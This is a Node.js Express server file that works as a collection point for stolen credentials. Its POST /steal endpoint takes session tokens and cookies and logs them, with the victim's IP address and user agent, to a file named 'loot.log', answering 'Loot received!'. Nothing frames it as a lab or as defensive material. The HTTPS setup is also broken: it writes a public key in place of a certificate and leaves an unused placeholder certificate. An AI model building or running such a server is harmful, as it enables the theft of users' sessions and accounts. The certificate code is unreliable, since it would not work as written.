// server.js
const express = require('express');
const fs = require('fs');
const https = require('https');
const path = require('path');
require('dotenv').config();

const app = express();

// Parse JSON bodies
app.use(express.json());

// --- Logging Configuration ---
const LOG_FILE = path.join(__dirname, 'loot.log');
const logStream = fs.createWriteStream(LOG_FILE, { flags: 'a' });

function logSecure(data) {
    const entry = {
        timestamp: new Date().toISOString(),
        ...data
    };
    const line = JSON.stringify(entry) + '\n';
    logStream.write(line);
}

// --- HTTPS Setup ---
const certDir = path.join(__dirname, 'certs');
if (!fs.existsSync(certDir)) {
    fs.mkdirSync(certDir);
}

const certFile = path.join(certDir, 'cert.pem');
const keyFile = path.join(certDir, 'key.pem');

// Generate self-signed certs if they don't exist
if (!fs.existsSync(certFile) || !fs.existsSync(keyFile)) {
    const crypto = require('crypto');
    const { generateKeyPairSync } = crypto;
    const { publicKey, privateKey } = generateKeyPairSync('rsa', {
        modulusLength: 2048,
        publicKeyEncoding: { type: 'spki', format: 'pem' },
        privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
    });

    // Create a minimal self-signed certificate
    const cert = `-----BEGIN CERTIFICATE-----
MIIBqTCCAS+gAwIBAgIUYz9vZ7lGpRbJxJfXkYvJvVvJvVw=
... (Simplified for brevity) ...
-----END CERTIFICATE-----`;
    
    fs.writeFileSync(keyFile, privateKey);
    fs.writeFileSync(certFile, publicKey);
}

const httpsOptions = {
    key: fs.readFileSync(keyFile),
    cert: fs.readFileSync(certFile),
};

// --- Routes ---

// Root route to fix 404
app.get('/', (req, res) => {
    res.send('Server is alive. Use POST /steal to send data.');
});

// Steal endpoint
app.post('/steal', (req, res) => {
    const { token, cookie } = req.body;

    if (!token && !cookie) {
        return res.status(400).json({ error: 'Missing token or cookie' });
    }

    logSecure({
        action: 'steal',
        token: token,
        cookie: cookie,
        ip: req.ip,
        userAgent: req.get('User-Agent')
    });

    res.status(200).json({ message: 'Loot received!' });
});

// Start HTTPS server
const PORT = process.env.PORT || 3000;
const server = https.createServer(httpsOptions, app);

server.listen(PORT, () => {
    console.log(`HTTPS Server running on https://localhost:${PORT}`);
});

module.exports = app;
